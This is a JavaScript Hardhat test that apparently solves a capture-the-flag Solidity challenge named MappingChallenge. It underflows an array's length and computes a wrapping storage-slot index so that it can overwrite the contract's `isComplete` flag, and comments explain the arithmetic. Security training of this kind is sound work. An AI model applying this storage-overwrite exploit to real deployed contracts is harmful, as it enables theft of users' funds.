const { expect } = require('chai');
const { BigNumber } = ethers;

describe('MappingChallenge', function () {
  it('should solve the challenge', async function () {
    const [owner] = await ethers.getSigners();

    // Deploy challenge
    const MappingChallenge = await ethers.getContractFactory('MappingChallenge');
    const challenge = await MappingChallenge.deploy();
    console.log('Challenge deployed');

    // Create array of max length
    const MAX_UINT = BigNumber.from(2).pow(256);
    await challenge.set(MAX_UINT.sub(2), 0);

    // `map` array is at slot 1, `isComplete` is at slot 0.
    //
    // We need the two's complement of the difference between
    // the slot to modify and the keccak of the array slot.
    // Since the slot to modify is zero, and the two's
    // complement is computed with: 2^256 - x, we can just
    // subtract the keccak of the array slot from 2^256
    //
    // N.B: this is equal to `keccak256(1)` in solidity
    const mapSlot = ethers.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001');
    const targetSlot = MAX_UINT.sub(mapSlot);
    await challenge.set(targetSlot, 1);

    const result = await challenge.isComplete();
    expect(result).to.be.true;
  });
});
